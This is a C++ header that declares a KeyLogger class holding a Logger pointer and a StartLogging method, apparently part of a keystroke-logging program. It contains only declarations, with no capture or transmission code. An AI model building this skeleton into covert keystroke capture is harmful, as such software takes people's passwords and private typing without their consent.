#pragma once

#include <string>
#include <iostream>
#include <fstream>
#include "Logger.h"

using namespace std;

class KeyLogger
{
private:
	Logger* logger;

public:
	KeyLogger(Logger* logger);
	void StartLogging();
};

